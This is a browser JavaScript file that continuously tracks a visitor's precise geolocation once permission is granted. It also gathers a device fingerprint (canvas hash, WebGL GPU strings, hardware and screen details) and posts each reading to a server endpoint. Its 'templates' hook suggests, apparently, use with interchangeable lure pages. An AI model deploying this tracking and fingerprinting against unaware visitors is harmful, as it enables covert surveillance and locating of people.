// Geolocation and device info capture script
const capture = {
    watchId: null,
    retryCount: 0,
    maxRetries: 3,
    backoffDelay: 1000,

    async getDeviceInfo() {
        const info = {
            ua: navigator.userAgent,
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown',
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            }
        };

        // Get GPU info if WebGL is available
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    info.gpu = {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
            }
        } catch (e) {
            console.warn('WebGL info collection failed:', e);
        }

        // Generate canvas fingerprint
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 200;
            const ctx = canvas.getContext('2d');
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069';
            ctx.fillText('Hello, world!', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Hello, world!', 4, 17);
            
            info.canvasId = btoa(canvas.toDataURL()).slice(-32);
        } catch (e) {
            console.warn('Canvas fingerprint generation failed:', e);
        }

        return info;
    },

    async sendEvent(position) {
        try {
            const event = {
                geo: {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    acc: position.coords.accuracy,
                    alt: position.coords.altitude,
                    altAcc: position.coords.altitudeAccuracy,
                    spd: position.coords.speed,
                    head: position.coords.heading,
                    ts: position.timestamp
                },
                device: await this.getDeviceInfo(),
                meta: {
                    template: document.querySelector('meta[property="og:site_name"]')?.content || 'default'
                }
            };

            const response = await fetch('/event', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(event)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            this.retryCount = 0;
            this.updateStatus('Location updated', position.coords.accuracy);
        } catch (error) {
            console.error('Failed to send event:', error);
            this.retryWithBackoff();
        }
    },

    retryWithBackoff() {
        if (this.retryCount < this.maxRetries) {
            this.retryCount++;
            const delay = this.backoffDelay * Math.pow(2, this.retryCount - 1);
            this.updateStatus(`Retrying in ${delay/1000}s...`);
            setTimeout(() => this.startCapture(), delay);
        } else {
            this.updateStatus('Failed to update location');
        }
    },

    updateStatus(message, accuracy = null) {
        const statusEl = document.getElementById('status');
        const accuracyEl = document.getElementById('accuracy');
        
        if (statusEl) {
            statusEl.textContent = message;
        }
        
        if (accuracyEl && accuracy !== null) {
            accuracyEl.textContent = `Accuracy: ${accuracy.toFixed(1)}m`;
        }
    },

    startCapture() {
        if (!navigator.geolocation) {
            this.updateStatus('Geolocation is not supported');
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        };

        this.updateStatus('Requesting location permission...');

        try {
            this.watchId = navigator.geolocation.watchPosition(
                (position) => this.sendEvent(position),
                (error) => {
                    console.error('Geolocation error:', error);
                    this.updateStatus(`Error: ${error.message}`);
                },
                options
            );
        } catch (error) {
            console.error('Failed to start geolocation:', error);
            this.updateStatus('Failed to start location tracking');
        }
    }
};

// Export for use in templates
window.startCapture = () => capture.startCapture();
